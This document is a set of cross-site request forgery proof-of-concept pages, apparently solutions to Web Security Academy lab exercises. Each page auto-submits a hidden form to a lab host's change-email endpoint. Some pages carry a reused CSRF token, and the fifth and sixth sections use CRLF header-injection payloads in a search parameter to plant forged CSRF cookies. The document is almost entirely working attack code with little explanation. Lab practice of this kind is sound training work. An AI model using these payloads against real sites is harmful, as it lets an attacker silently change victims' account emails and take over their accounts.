## 1. CSRF vulnerability with no defenses

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Hello, world!</title>
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <meta name="description" content="" />
  <link rel="icon" href="favicon.png">
</head>
<body>
  <form id="payload" class="login-form" name="change-email-form" action="https://0ad000f904bd71b481b5a74100780094.web-security-academy.net/my-account/change-email" method="POST">
  <input name="email" value="some@some.com">
  </form>
<script>
  var form= document.getElementById('payload');
  form.submit();
</script>
</body>
</html>
```

## 2. CSRF where token validation depends on request method

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a5500ca049ad34580459ece00c30021.web-security-academy.net/my-account/change-email">
      <input type="hidden" name="email" value="some@m.com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

## 3. CSRF where token validation depends on token being present

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a2f00e903d7f101802f4e1500eb0062.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="some@so.me" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```


## 4. CSRF where token is not tied to user session

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a2a0077035523e080d4c64400fa002b.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="some@so.me" />
      <input type="hidden" name="csrf" value="2M6MMQsnJ5k8jGc1Hzbt2PxDsv5Ygu0r" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```


## 5. CSRF where token is tied to non-session cookie

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0ad500f504a19c0781574d0a0007009a.web-security-academy.net/">
    <input type="hidden" name="search" value="aa&#13;&#10;Set&#45;Cookie&#58;&#32;csrfKey&#61;aab&#59;&#32;SameSite&#61;None" />
      <input type="hidden" name="search" value="aa%0d%0aSet-Cookie:%20csrfKey=1H2ylNLJMg75eOmIbMYm8T8fHz3BmLP9%3B%20SameSite%3DNone" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0ad500f504a19c0781574d0a0007009a.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="some@so.me" />
      <input type="hidden" name="csrf" value="aab" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

## 6. CSRF where token is duplicated in cookie

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a3600a004d2a3e280db353c00b4001c.web-security-academy.net/">
      <input type="hidden" name="search" value="aa&#13;&#10;Set&#45;Cookie&#58;&#32;csrf&#61;aab&#59;&#32;SameSite&#61;None" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a3600a004d2a3e280db353c00b4001c.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="some4&#64;so&#46;me" />
      <input type="hidden" name="csrf" value="aab" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
